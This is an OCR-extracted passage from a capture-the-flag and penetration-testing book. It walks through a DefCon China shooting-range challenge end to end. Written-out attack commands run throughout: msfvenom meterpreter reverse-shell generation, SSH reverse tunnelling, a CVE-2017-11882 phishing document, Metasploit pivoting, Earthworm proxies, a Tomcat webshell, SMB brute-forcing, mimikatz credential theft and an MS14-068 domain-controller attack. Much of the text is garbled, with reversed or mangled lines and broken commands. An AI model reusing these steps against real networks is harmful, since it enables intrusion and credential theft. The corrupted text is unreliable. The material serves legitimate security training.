rated
KrbCredgenerated
Fig, 12.70 Result
[]Tasked beacon to
[DC]
sa  11,4y. [30]
OC
object Ros
: krbtgt
+SAN ACCOUNT **
tTyp
krbtgt
USER_03ECT)
L_ACCOUNT)
last
582
289897677-2387368120-582
Fig, 12.71 Result
Krbtgt account information can then be successfully obtained through mimikatz
(see Fig. 12.71 for results).
mimikatz *1sadump : :dcayne /domain:scanf com /user :krbtgta
[daonaspe/sdq 11o=daonspe/sdq sed qam uaa
640, https://adsecurity. org/?p=1515
---
## Page 799
788
12 Virtual Target Penetration Test
12.6
Penetration Test Challenges in Practice
The most obvious difference between CTF penetration challenges and real penetra-
tion tests is that there must be a solution in CTF, and the information at each piece of
information in the process of solving the challenge is critical, including emails, links, 
articles on websites, etc. Therefore, competitors need to keep up with the ideas of the
questioner and pay close attention to the information revealed in the question.
In the following, I will introduce you with some CTF challenges that I have
encountered with in the past, but I will not go into details because the environment
for the challenges does not exist anymore.
12.6.1
DefCon China ShootingRange Questions
The entire challenge’s solving process is shown in Fig. 12.72.
1. Wordpress
Open 192.168.1.2 is a wordpress application, first I used wpscan to scan it for
plugins, account password blasting, and found that the password is admin/admin,
but also by blasting, I found that the computer's SSH account password is root/
admin, so that they get the first flag, see Fig. 12.73.
ad domain
192. 168. 1. 254
word click bot
192. 168. 2. 112
user pc
172. 16.8.8
192. 168. 1.2
192. 168.2. 114
192. 168. 2. 104
wordpress
word click server
tomcat
192. 168.2. 10
ad DC
Fig, 12.72 The entire challenge's solving process
---
## Page 800
12.6 Penetration Test Challenges in Practice
789
Fig, 12.73 Get flag
rootéubuntu:/var/Log/apache2#cat/root/fLag
flog{welCome_to_DeFcon_ChiNa}
ooteubuntu:/var/Log/apache2#
oche2/sites-enobled# cot word.conf
ust o
Mauett"
s Host: heoder
oumust set it for ony furt
gardless.
IServer
Howe
eww.exomple.con
virt
tntRoot/vor/mm/htnL/wordpress/wp-content/uploods/file
Fig, 12.74 The configuration
92.168.1.254 - -
12/M
*GET /repo
2818:16:11:354
018:16:48:51
]GET/rep
Fig, 12.75 Result
2. Word Document Phishing
In configuration of the apache, you can find the existence of port 8000, whose web
path is the upload file directory under wordpress, and the configuration is shown in
Fig. 12.74
From the HTTP log, it is observed that there is a bot that will request report.doc
every now and then, see Fig. 12.75. We tried to hack the bot with CVE-2017-11882
is successful, and the steps is as follows.
The trial use of CVE-2017-11882 is successful, and the steps are as follows.
(1) Due to the intranet environment of the competition, it was a hard time for us to
get the backdoor, so we need to do port forwarding with ssh first, and use the
machine 192.168.1.2 which is running the Wordpress website as a jump box.
ssh - CfNg -R 13339 :127.0.0.1: 13338 root@192 .168.1.2
---
## Page 801
06L
12 Virtual Target Penetration Test
:59:36ca5:cbc
Fig, 12.76 Result
(2) Using msfvenom to generate an HTA malicious file, is a backdoor program that
will try connect to our server, combined with the port forwarding described
earlier. When the victim launch the malicious file, it firstly connects to port 
13339 of 192.168.1.2, then port forwarding through 192.168.1.2 will forward
trafic to the attacker’s port 13338.
msfvenom -p windows/meterpreter/reverse_tcp 1host=192 .168.1.2
' o- qsd- g- 6=xod
(3) Use Exp to generate malicious DOC files.
u*e/008 z**89*26t/:da euu, o- d.z88-t0- uod
test.doc
(4) Make metasploit to listen on port 13338.
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0 .0 .0 .0.0
set LPORT 13338
exploit -j
The exploitation is successful, resulting in a backdoor connection from
192.168.2.1/24 segment, which is the connection from 192.168.2.114 shown in
Fig. 12.76.
You can find the flag file in the root directory of the C drive, see Fig. 12.77.
---
## Page 802
12.6  Penetration Test Challenges in Practice
16L
C:\Wtndows\systen32>whoant
wtn-atcopfvcfej\rtf
C:\wtndows\systen32>dtr c:\
dtrci\
Celoio6okoo
C:\**X
2018/05/07
17:14
30flag
2009/07/14
2018/05/03
12:56
Progran Ftles
PerfLc
sbc
2018/05/03
2018/04/11
19:19
12:58
Progran Files (x86)
wLndows
Users
2018/05/12
00:01
5 *lx
7,322,238,976 ***
30
C:(windows
S\systen32>type c:\flag
x
Fig, 12.77 Get flag
3. Tomcat
Since you only have the 192.168.2.114 machine, you can use it to do further
exploration of the intranet to expand your privileges.
(1) Add a route so that you can access the 192.168.2.1/24 computer via Metasploit.
run autoroute -s 192 .168 .2 .1/24
(2) Perform port scanning.
use auxi1iary/scanner/portscan/tcp
set RHoSTS 192 .168 .2 .1/24
set PORTS 3389, 445, 22, 80, 8080
set THREADS 50
exp1oit
metasploit is a Socks4 proxy, which is very slow, so you are recommended to use
Earthworm.
(3) Upload the Earthworm program.
---
## Page 803
792
12  Virtual Target Penetration Test
99d 1 lM IDs&eMet I E
and 18helLOrLne 1BackLConmtd1aita.fafect 1 EeiL Liva,Cods 1 PetSoan 1 Do
Enecute Progrim s
ERcule
cute Shell s
ExBcute
Fig, 12.78 Get flag
ers/RTF/Desktop
(4) Launch a proxy with port 10080 listening on 192.168.1.2(wordpress).
. /ew_for_1inux64 -s rcsocks -1 10080 -e 8881
(5) Connect the node with ip address of 192.168.2.114 to the jumpbox located at
192.168.1.2.
C: /Users/RTF/Desktop/ev.exe -s rssocks -d 192.168 .1 .2 -e 8881
Finally, all the traffic through 192.168.1.2:10080 will be proxied to their intranet.
do se 017891761 1e punoy am 'oun  uo s uogenad e Suop g
ports 80 and 8080, where 8080 is Tomca, whose default password is tomcat/tomcat.
Then, we deployed the war package to get a webshell with root privileges, and got a
flag in the root directory, see Fig. 12.78.
Information is collected on 192.168.2.104 and MySQL connection information is
found in the /var/www/html/inc/config-php file.
SDB=nev MyD8(*127. 0.0 1*, *mai1#, *mai1123456a,*my_mai1*) ;
After queries from the database, it is found that the password of a computer on the
intranet is admin @test.COM, as shown in Fig. 12.79.
4. Windows PC
We can use the smb_login module in metasploit to blast the account password and
find that 192.168.2.112 can be logged in successfully, see Fig. 12.80.
---
## Page 804
12.6 Penetration Test Challenges in Practice
E6L
22
a tip
Fig, 12.79 Get ips
Fig, 12.80 Result
sfauxtltaryscanner/portsc
n/tcp)>sesstons -16
Hlcrosoft
ntauthortty\systen
The request wlll be processed at a donatn controller for donatn ad.con
User accounts for \\dc.ad.con
Adntntstrator
Cuest
krbtgt
laval
and conpleted wlth one or nore errors.
voss
The con
Fig, 12.81 Result
For convenience, port 3389 is forwarded here for login, and then the backdoor
connection is up and running with administrator privileges, see Fig. 12.81.
5. Attack Windows Domain Control
A process launched by a domain user named ADPC was found by listing the
processes, see Fig. 12.82.
So we try to capture its password with the mimikatz, it is found that its password
is also admin @test.COM, see Fig. 12.83.
The net user command allows you to see that the PC user is just a common
domain user, as shown in Fig. 12.84.
---
## Page 805
794
12  Virtual Target Penetration Test
strate
Fig, 12.82 Result
neterpreter >kerberos
oadtng exten
tonatwtkatz...Success.
uthIo
package
Donata
User
Password
lcetate
NTUA
PC
1997
AD
AUTHORITY
0;42383
NTLM
PCS
0:74994853 KerberosAD
Late
PCS
pC
adntngtest.coM
Fig. 12.83 Result
The net view finds some computers under the control of AD domain, and since
the remark is pretty obvious, you can find that the domain controller is crDC, see
Fig. 12.85.
The exploit of ms14-068 is performed to aftack the domain controller.
https ://github . com/abatchy27/HindowsExploits/tree/maeter/Ms14 -068
You can use the following commands to launch the attack.
pxoxssed xoqusu ureuog d- ssoxppe xaTtoxquoo
ms14 - 068 ,exe -u Domain member@domain -s Domain menber s1d -d Domain
1970748206-1116 -d 192.168.2.10 -p admin9test .COM
- 0518066991-8889+8192-1-5-1-9 5- 105*pe89d n- 9x9'890 -199
The sid of a domain member is obtained through the migrating to the process
launched by ADiPC user and is shown in Fig. 12.86.
Purge credentials with mimikatz.
mimikatz,exe *kerberos::purge* *kerberos::list* *exit*
Injection of forged credentials.
---
## Page 806
12.6 Penetration Test Challenges in Practice
795
C:\windowssysten32>net user
tet
user pc
onaln
pc/donatn
will be processed at a domatn controller for donatn ad.con
Full Nare
Iser
nane
pc
pc
User's con
went
Countrycode
000 (Systen Default)
Account acttve
Account expires
Never
SOA
Password last set
5/12/2018 2:17:51 AM
Password
Password
changeable
expires
5/13/2018 2:17:51 AM
5/23/2618
2:17:51
AM
Password required
User nay change password
Yes
Yes
Horkstattons allowed
ALL
Logon script
Jser
proflle
lone
dlrectory
Last
uobo1
5/12/2018 3:13:26 AM
Logon hours allowed
ALL
Local Group Menberships
The connand conpleted successfully.
*Donatn Users
Fig, 12.84 Result
Fig, 12.85 Result
C:\windows|system32>netview/donatn
net vlew /domain
Donain
AD
The
connand conpleted successfully.
C:\wtndows\system32>net vtew /donatn:AD
net view/domain:AD
Server Name
Renark
5011
dc
IIPC
The connand conpleted successfully.
pC
---
## Page 807
796
12 Virtual Target Penetration Test
neterpreter>nlgrate 3180
[]Migratton c
Process 3508 created.
Copyright （c)2oo9 Microsoft Corporatton.
All rtghts reserved.
C:\windows\systen32>whoant
ad\pc
whoant
whoamt/all
C:\wtndows\systen32>whoant /all
USER INFORMATION
User Nane SID
ad\pc
S-1-5-21-2251846888-1669908150-1970748206-1116
Fig, 12.86 Result
mimikatz,exe *kerberos: :ptc TGT_pcsad. con.ccache*
Finally, you can log directly in domain controller and get the flag, see Fig. 12.87.
12.7 Summary
This chapter introduces how to build a penetration test environment for common
vulnerabilities on Windows and Linux, how to exploit common vulnerabilities and
some of the principles; demonstrates some attack techniques with some scenarios
and expands your view through the cases of historical competition challenges.
However, after acquiring this basic knowledge of penetration, competitors still
 t u n ss to Ko aoq to n to opmo ano ug on pou
environment. In the meantime, we have also provided a set of virtual targets on
the N1BOOK platform for the readers can download and practice locally.
This concludes the technical chapter of this book, and we hope readers will find it
rewarding after reading this book.
---
## Page 808
12.7Summay
797
c:lusersipc\oesktop>kttst
Kltst
Current LogonId ts 0:8x47854a5
Cached Tickets: (1)
5/19/20183:13:26
5/12/201813:13:26
(local)
Sesston Key Type: RSADSI RC4-HPAC(NT)
ocal)
c:↓Users|pc\Desktop>dtr \\dc\cs
Voluse Sertal Nunber ts EesE-CCBE
Dlrectory of \\dc\cs
05/67/2018
818 4 
07/13/2669
91:68P
11/15/2017
11:13
Progran Ftles
11/15/2017
11/15/2017
11:09
06:32
AH
11/24/2017
10:01
users
11/23/2017
1Ftte(s)
PH
6Dtr(s)
20,878,172,166 bytes free
c:↓users\pc\0esktop>type \|dc\cS}ftag
c:\users\pc\Desktop>
u_Htyou)
Fig, 12.87 Get flag
---